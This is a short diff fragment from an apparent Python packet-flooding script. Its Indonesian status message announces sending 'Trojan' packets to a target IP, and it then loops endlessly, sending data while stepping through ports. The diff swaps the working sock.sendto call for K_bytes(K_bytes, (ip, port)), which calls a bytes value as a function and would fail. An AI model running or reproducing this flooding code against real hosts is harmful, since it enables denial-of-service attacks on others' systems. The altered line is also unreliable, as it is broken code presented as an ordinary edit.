@@ -48,7 +48,7 @@ print("Memulai Mengirim Packet Trojan ", ip, " Dan Ke port ", port, "...")
 time.sleep(5)
 sent = 0
 while True:
-    sock.sendto(K_bytes, (ip, port))
+    K_bytes(K_bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     ping = ping + 1
